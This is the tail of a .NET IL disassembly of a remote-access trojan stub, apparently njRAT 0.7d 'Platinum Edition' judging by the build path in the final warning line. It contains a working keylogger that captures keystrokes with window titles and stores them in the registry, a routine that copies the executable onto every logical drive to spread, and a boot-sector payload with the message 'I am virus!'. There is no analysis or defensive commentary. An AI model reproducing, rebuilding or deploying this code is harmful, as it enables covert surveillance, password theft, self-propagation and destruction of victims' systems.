    IL_000d:  ldarg.0
    IL_000e:  ldstr      ""
    IL_0013:  stfld      string j.kl::Logs
    IL_0018:  ldarg.0
    IL_0019:  ldstr      "[kl]"
    IL_001e:  stfld      string j.kl::vn
    IL_0023:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       216 (0xd8)
    .maxstack  5
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             class [System]System.Diagnostics.Process V_3,
             valuetype [mscorlib]System.DateTime V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 j.kl::LastAV
      IL_0023:  ceq
      IL_0025:  ldarg.0
      IL_0026:  ldfld      string j.kl::LastAS
      IL_002b:  ldloc.3
      IL_002c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0031:  ldc.i4.0
      IL_0032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0037:  ldc.i4.0
      IL_0038:  ceq
      IL_003a:  and
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0046:  ldc.i4.0
      IL_0047:  ceq
      IL_0049:  or
      IL_004a:  brtrue.s   IL_00b3

      IL_004c:  ldarg.0
      IL_004d:  ldloca.s   V_2
      IL_004f:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_0054:  stfld      int32 j.kl::LastAV
      IL_0059:  ldarg.0
      IL_005a:  ldloc.3
      IL_005b:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0060:  stfld      string j.kl::LastAS
      IL_0065:  ldc.i4.6
      IL_0066:  newarr     [mscorlib]System.String
      IL_006b:  dup
      IL_006c:  ldc.i4.0
      IL_006d:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_0072:  stelem.ref
      IL_0073:  dup
      IL_0074:  ldc.i4.1
      IL_0075:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_007a:  stloc.s    V_4
      IL_007c:  ldloca.s   V_4
      IL_007e:  ldstr      "yy/MM/dd "
      IL_0083:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0088:  stelem.ref
      IL_0089:  dup
      IL_008a:  ldc.i4.2
      IL_008b:  ldloc.3
      IL_008c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0091:  stelem.ref
      IL_0092:  dup
      IL_0093:  ldc.i4.3
      IL_0094:  ldstr      " "
      IL_0099:  stelem.ref
      IL_009a:  dup
      IL_009b:  ldc.i4.4
      IL_009c:  ldarg.0
      IL_009d:  ldfld      string j.kl::LastAS
      IL_00a2:  stelem.ref
      IL_00a3:  dup
      IL_00a4:  ldc.i4.5
      IL_00a5:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00aa:  stelem.ref
      IL_00ab:  call       string [mscorlib]System.String::Concat(string[])
      IL_00b0:  stloc.0
      IL_00b1:  leave.s    IL_00d6

      IL_00b3:  leave.s    IL_00d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b5:  dup
      IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bb:  stloc.s    V_5
      IL_00bd:  ldloc.s    V_5
      IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ce:  leave.s    IL_00d0

    }  // end handler
    IL_00d0:  ldstr      ""
    IL_00d5:  stloc.0
    IL_00d6:  ldloc.0
    IL_00d7:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       380 (0x17c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             bool V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             class [mscorlib]System.Exception V_4,
             char V_5)
    IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000f:  stloc.2
    IL_0010:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0015:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_001f:  brfalse.s  IL_002a

    IL_0021:  ldloc.2
    IL_0022:  brfalse.s  IL_0028

    IL_0024:  ldc.i4.0
    IL_0025:  stloc.2
    IL_0026:  br.s       IL_002a

    IL_0028:  ldc.i4.1
    IL_0029:  stloc.2
    IL_002a:  nop
    .try
    {
      IL_002b:  ldarg.1
      IL_002c:  stloc.3
      IL_002d:  ldloc.3
      IL_002e:  ldc.i4.s   35
      IL_0030:  bgt.s      IL_0066

      IL_0032:  ldloc.3
      IL_0033:  ldc.i4.s   13
      IL_0035:  bgt.s      IL_0050

      IL_0037:  ldloc.3
      IL_0038:  ldc.i4.8
      IL_0039:  beq.s      IL_00a1

      IL_003b:  ldloc.3
      IL_003c:  ldc.i4.s   9
      IL_003e:  beq        IL_00fe

      IL_0043:  ldloc.3
      IL_0044:  ldc.i4.s   13
      IL_0046:  beq        IL_00d9

      IL_004b:  br         IL_0106

      IL_0050:  ldloc.3
      IL_0051:  ldc.i4.s   16
      IL_0053:  sub
      IL_0054:  ldc.i4.1
      IL_0055:  ble.un.s   IL_00c3

      IL_0057:  ldloc.3
      IL_0058:  ldc.i4.s   32
      IL_005a:  beq.s      IL_00ce

      IL_005c:  ldloc.3
      IL_005d:  ldc.i4.s   35
      IL_005f:  beq.s      IL_00c3

      IL_0061:  br         IL_0106

      IL_0066:  ldloc.3
      IL_0067:  ldc.i4     0xa3
      IL_006c:  bgt.s      IL_0087

      IL_006e:  ldloc.3
      IL_006f:  ldc.i4.s   46
      IL_0071:  beq.s      IL_00a1

      IL_0073:  ldloc.3
      IL_0074:  ldc.i4.s   112
      IL_0076:  sub
      IL_0077:  ldc.i4.s   11
      IL_0079:  ble.un.s   IL_00c3

      IL_007b:  ldloc.3
      IL_007c:  ldc.i4     0xa0
      IL_0081:  sub
      IL_0082:  ldc.i4.3
      IL_0083:  ble.un.s   IL_00c3

      IL_0085:  br.s       IL_0106

      IL_0087:  ldloc.3
      IL_0088:  ldc.i4     0x10000
      IL_008d:  beq.s      IL_00c3

      IL_008f:  ldloc.3
      IL_0090:  ldc.i4     0x20000
      IL_0095:  beq.s      IL_00c3

      IL_0097:  ldloc.3
      IL_0098:  ldc.i4     0x40000
      IL_009d:  beq.s      IL_00c3

      IL_009f:  br.s       IL_0106

      IL_00a1:  ldstr      "["
      IL_00a6:  ldarga.s   k
      IL_00a8:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
      IL_00ae:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_00b3:  ldstr      "]"
      IL_00b8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00bd:  stloc.0
      IL_00be:  leave      IL_017a

      IL_00c3:  ldstr      ""
      IL_00c8:  stloc.0
      IL_00c9:  leave      IL_017a

      IL_00ce:  ldstr      " "
      IL_00d3:  stloc.0
      IL_00d4:  leave      IL_017a

      IL_00d9:  ldarg.0
      IL_00da:  ldfld      string j.kl::Logs
      IL_00df:  ldstr      "[ENTER]\r\n"
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_00e9:  brfalse.s  IL_00f6

      IL_00eb:  ldstr      ""
      IL_00f0:  stloc.0
      IL_00f1:  leave      IL_017a

      IL_00f6:  ldstr      "[ENTER]\r\n"
      IL_00fb:  stloc.0
      IL_00fc:  leave.s    IL_017a

      IL_00fe:  ldstr      "[TAP]\r\n"
      IL_0103:  stloc.0
      IL_0104:  leave.s    IL_017a

      IL_0106:  ldloc.2
      IL_0107:  brfalse.s  IL_0118

      IL_0109:  ldarg.1
      IL_010a:  conv.ovf.u4
      IL_010b:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0110:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0115:  stloc.0
      IL_0116:  leave.s    IL_017a

      IL_0118:  ldarg.1
      IL_0119:  conv.ovf.u4
      IL_011a:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_011f:  stloc.1
      IL_0120:  leave.s    IL_0178

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0122:  dup
      IL_0123:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0128:  stloc.s    V_4
      IL_012a:  ldloc.s    V_4
      IL_012c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0131:  ldloc.2
      IL_0132:  brfalse.s  IL_0157

      IL_0134:  ldarg.1
      IL_0135:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_013a:  stloc.s    V_5
      IL_013c:  ldloca.s   V_5
      IL_013e:  call       instance string [mscorlib]System.Char::ToString()
      IL_0143:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0148:  stloc.1
      IL_0149:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014e:  ldloc.1
      IL_014f:  stloc.0
      IL_0150:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0155:  leave.s    IL_017a

      IL_0157:  ldarg.1
      IL_0158:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_015d:  stloc.s    V_5
      IL_015f:  ldloca.s   V_5
      IL_0161:  call       instance string [mscorlib]System.Char::ToString()
      IL_0166:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_016b:  stloc.1
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0171:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0176:  leave.s    IL_0178

    }  // end handler
    IL_0178:  ldloc.1
    IL_0179:  stloc.0
    IL_017a:  ldloc.0
    IL_017b:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       138 (0x8a)
    .maxstack  7
    .locals init (string V_0,
             class [mscorlib]System.Text.StringBuilder V_1,
             uint8[] V_2,
             uint32 V_3,
             int32 V_4,
             native int V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_7)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.1
      IL_0006:  ldc.i4     0xff
      IL_000b:  newarr     [mscorlib]System.Byte
      IL_0010:  stloc.2
      IL_0011:  ldloc.2
      IL_0012:  call       bool j.kl::GetKeyboardState(uint8[])
      IL_0017:  brtrue.s   IL_0021

      IL_0019:  ldstr      ""
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0088

      IL_0021:  ldarg.0
      IL_0022:  ldc.i4.0
      IL_0023:  call       uint32 j.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0028:  stloc.3
      IL_0029:  ldc.i4.0
      IL_002a:  stloc.s    V_4
      IL_002c:  call       native int j.OK::GetForegroundWindow()
      IL_0031:  ldloca.s   V_4
      IL_0033:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0038:  call       int32 j.kl::GetKeyboardLayout(int32)
      IL_003d:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_0042:  stloc.s    V_5
      IL_0044:  ldarg.0
      IL_0045:  ldloc.3
      IL_0046:  ldloc.2
      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.5
      IL_0049:  ldc.i4.0
      IL_004a:  ldloc.s    V_5
      IL_004c:  call       int32 j.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_0051:  pop
      IL_0052:  ldloc.1
      IL_0053:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0058:  stloc.0
      IL_0059:  leave.s    IL_0088

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005b:  dup
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0061:  stloc.s    V_6
      IL_0063:  ldloc.s    V_6
      IL_0065:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_006f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0074:  leave.s    IL_0076

    }  // end handler
    IL_0076:  ldarg.0
    IL_0077:  conv.ovf.i4.un
    IL_0078:  stloc.s    V_7
    IL_007a:  ldloca.s   V_7
    IL_007c:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0082:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0087:  stloc.0
    IL_0088:  ldloc.0
    IL_0089:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       286 (0x11e)
    .maxstack  5
    .locals init (int32 V_0,
             int32 V_1,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_2,
             string V_3,
             int32 V_4,
             class [mscorlib]System.Exception V_5)
    IL_0000:  ldarg.0
    IL_0001:  ldarg.0
    IL_0002:  ldfld      string j.kl::vn
    IL_0007:  ldstr      ""
    IL_000c:  call       object j.OK::GTV(string,
                                          object)
    IL_0011:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0016:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001b:  stfld      string j.kl::Logs
    .try
    {
      IL_0020:  ldc.i4.0
      IL_0021:  stloc.0
      IL_0022:  ldloc.0
      IL_0023:  ldc.i4.1
      IL_0024:  add.ovf
      IL_0025:  stloc.0
      IL_0026:  ldc.i4.0
      IL_0027:  stloc.1
      IL_0028:  ldloc.1
      IL_0029:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_002e:  ldc.i4     0xffff8001
      IL_0033:  ceq
      IL_0035:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_003a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_003f:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_0044:  ldc.i4.0
      IL_0045:  ceq
      IL_0047:  and
      IL_0048:  brfalse.s  IL_008d

      IL_004a:  ldloc.1
      IL_004b:  stloc.2
      IL_004c:  ldarg.0
      IL_004d:  ldloc.2
      IL_004e:  call       instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_0053:  stloc.3
      IL_0054:  ldloc.3
      IL_0055:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_005a:  ldc.i4.0
      IL_005b:  ble.s      IL_0086

      IL_005d:  ldarg.0
      IL_005e:  ldarg.0
      IL_005f:  ldfld      string j.kl::Logs
      IL_0064:  ldarg.0
      IL_0065:  call       instance string j.kl::AV()
      IL_006a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_006f:  stfld      string j.kl::Logs
      IL_0074:  ldarg.0
      IL_0075:  ldarg.0
      IL_0076:  ldfld      string j.kl::Logs
      IL_007b:  ldloc.3
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0081:  stfld      string j.kl::Logs
      IL_0086:  ldarg.0
      IL_0087:  ldloc.2
      IL_0088:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_008d:  ldloc.1
      IL_008e:  ldc.i4.1
      IL_008f:  add.ovf
      IL_0090:  stloc.1
      IL_0091:  ldloc.1
      IL_0092:  ldc.i4     0xff
      IL_0097:  ble.s      IL_0028

      IL_0099:  ldloc.0
      IL_009a:  ldc.i4     0x3e8
      IL_009f:  bne.un.s   IL_00f7

      IL_00a1:  ldc.i4.0
      IL_00a2:  stloc.0
      IL_00a3:  ldstr      "[klen]"
      IL_00a8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00ad:  ldc.i4     0x400
      IL_00b2:  mul.ovf
      IL_00b3:  stloc.s    V_4
      IL_00b5:  ldarg.0
      IL_00b6:  ldfld      string j.kl::Logs
      IL_00bb:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00c0:  ldloc.s    V_4
      IL_00c2:  ble.s      IL_00e4

      IL_00c4:  ldarg.0
      IL_00c5:  ldarg.0
      IL_00c6:  ldfld      string j.kl::Logs
      IL_00cb:  ldc.i4.0
      IL_00cc:  ldarg.0
      IL_00cd:  ldfld      string j.kl::Logs
      IL_00d2:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00d7:  ldloc.s    V_4
      IL_00d9:  sub.ovf
      IL_00da:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_00df:  stfld      string j.kl::Logs
      IL_00e4:  ldarg.0
      IL_00e5:  ldfld      string j.kl::vn
      IL_00ea:  ldarg.0
      IL_00eb:  ldfld      string j.kl::Logs
      IL_00f0:  ldc.i4.1
      IL_00f1:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_00f6:  pop
      IL_00f7:  ldc.i4.1
      IL_00f8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_00fd:  br         IL_0022

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0102:  dup
      IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0108:  stloc.s    V_5
      IL_010a:  ldloc.s    V_5
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0116:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011b:  leave.s    IL_011d

    }  // end handler
    IL_011d:  ret
  } // end of method kl::WRK

} // end of class j.kl

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       6 (0x6)
    .maxstack  8
    IL_0000:  call       void j.OK::ko()
    IL_0005:  ret
  } // end of method A::main

} // end of class j.A

.class public auto ansi spredusb
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method spredusb::.ctor

  .method public static void  Start() cil managed
  {
    // Code size       104 (0x68)
    .maxstack  3
    .locals init (string V_0,
             string[] V_1,
             int32 V_2)
    IL_0000:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_000f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0014:  stloc.0
    IL_0015:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001a:  stloc.1
    IL_001b:  ldc.i4.0
    IL_001c:  stloc.2
    IL_001d:  br.s       IL_0061

    IL_001f:  ldloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldelem.ref
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  ldloc.0
      IL_0024:  ldsfld     string j.OK::RG
      IL_0029:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_002e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0033:  brtrue.s   IL_004f

      IL_0035:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
      IL_003a:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
      IL_003f:  ldloc.0
      IL_0040:  ldsfld     string j.OK::RG
      IL_0045:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_004a:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string)
      IL_004f:  leave.s    IL_005d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005b:  leave.s    IL_005d

    }  // end handler
    IL_005d:  ldloc.2
    IL_005e:  ldc.i4.1
    IL_005f:  add.ovf
    IL_0060:  stloc.2
    IL_0061:  ldloc.2
    IL_0062:  ldloc.1
    IL_0063:  ldlen
    IL_0064:  conv.i4
    IL_0065:  blt.s      IL_001f

    IL_0067:  ret
  } // end of method spredusb::Start

} // end of class spredusb

.class private auto ansi sealed '<PrivateImplementationDetails>'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=512'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 512
  } // end of class '__StaticArrayInitTypeSize=512'

  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' F4302D72A369C8BADBF2BE9C2854DF4529637155 at I_000113C8
  .method assembly static uint32  ComputeStringHash(string s) cil managed
  {
    // Code size       44 (0x2c)
    .maxstack  2
    .locals init (uint32 V_0,
             int32 V_1)
    IL_0000:  ldc.i4     0x811c9dc5
    IL_0005:  stloc.0
    IL_0006:  ldarg.0
    IL_0007:  brfalse.s  IL_002a

    IL_0009:  ldc.i4.0
    IL_000a:  stloc.1
    IL_000b:  br.s       IL_0021

    IL_000d:  ldarg.0
    IL_000e:  ldloc.1
    IL_000f:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0014:  ldloc.0
    IL_0015:  xor
    IL_0016:  ldc.i4     0x1000193
    IL_001b:  mul
    IL_001c:  stloc.0
    IL_001d:  ldloc.1
    IL_001e:  ldc.i4.1
    IL_001f:  add
    IL_0020:  stloc.1
    IL_0021:  ldloc.1
    IL_0022:  ldarg.0
    IL_0023:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0028:  blt.s      IL_000d

    IL_002a:  ldloc.0
    IL_002b:  ret
  } // end of method '<PrivateImplementationDetails>'::ComputeStringHash

} // end of class '<PrivateImplementationDetails>'


// =============================================================

.data cil I_000113C8 = bytearray (
                 EB 00 31 C0 8E D8 FC B8 12 00 CD 10 BE 24 7C B3  // ..1..........$|.
                 03 E8 02 00 EB FE B7 00 AC 3C 00 74 06 B4 0E CD  // .........<.t....
                 10 EB F5 C3 49 20 61 6D 20 76 69 72 75 73 21 20  // ....I am virus! 
                 46 75 63 6B 20 59 6F 75 20 3A 2D 29 00 00 00 00  // Fuck You :-)....
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA) // ..............U.
// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\King\Desktop\neww\SRC-njRAT-0.7d-Platinum-Edition-main\Stub\bin\Release\pstimp.res
